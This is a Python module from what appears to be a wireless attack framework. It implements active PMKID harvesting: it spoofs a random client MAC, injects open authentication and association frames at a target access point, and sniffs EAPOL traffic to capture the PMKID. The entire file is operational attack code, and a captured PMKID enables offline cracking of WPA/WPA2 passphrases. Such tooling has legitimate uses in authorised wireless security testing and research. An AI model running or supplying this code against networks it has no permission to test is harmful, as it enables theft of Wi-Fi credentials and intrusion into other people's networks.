#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""Active PMKID harvest — inherit ``Wlan_pmkid``."""

from __future__ import annotations

import time
from typing import Callable

from core.framework.base_module import BaseModule

from lib.protocols.wlan.ie import GENERIC_RSN_PSK_IE, find_rsn_ie
from lib.protocols.wlan.mac import mac_to_str, random_client_mac
from lib.protocols.wlan.mgmt import build_association_request, build_open_auth_request


class Wlan_pmkid(BaseModule):
    """Association + EAPOL sniff helpers for PMKID capture."""

    def wlan_pmkid_sta_mac(self) -> str:
        return mac_to_str(random_client_mac())

    def wlan_build_open_auth(self, bssid: str, sta: str) -> bytes:
        return build_open_auth_request(bssid, sta)

    def wlan_build_assoc(self, bssid: str, sta: str, ssid: str, rsn_ie: bytes = b"") -> bytes:
        ies = rsn_ie or GENERIC_RSN_PSK_IE
        return build_association_request(bssid, sta, ssid, extra_ies=ies)

    def wlan_rsn_from_beacon_ies(self, ies: bytes) -> bytes:
        found = find_rsn_ie(ies)
        return found or GENERIC_RSN_PSK_IE

    def wlan_pmkid_exchange(
        self,
        bssid: str,
        ssid: str,
        *,
        sta: str | None = None,
        rsn_ie: bytes = b"",
        dwell: float = 15.0,
        on_eapol: Callable[[bytes], None] | None = None,
        channel: int | None = None,
    ) -> str:
        """
        Send open-system auth + association, then sniff for EAPOL/PMKID.
        Returns the station MAC used.
        """
        station = sta or self.wlan_pmkid_sta_mac()
        if channel is not None:
            self.wlan_set_channel(int(channel))
        auth = self.wlan_build_open_auth(bssid, station)
        assoc = self.wlan_build_assoc(bssid, station, ssid, rsn_ie)
        self.wlan_inject_raw([auth, assoc], count=2)
        time.sleep(0.3)

        def sniff_cb(raw: bytes, _rssi: int | None) -> None:
            eap = self.wlan_parse_eapol(raw)
            if eap and eap.bssid.lower() == bssid.lower() and on_eapol:
                on_eapol(raw)

        self.wlan_sniff(sniff_cb, timeout=float(dwell))
        return station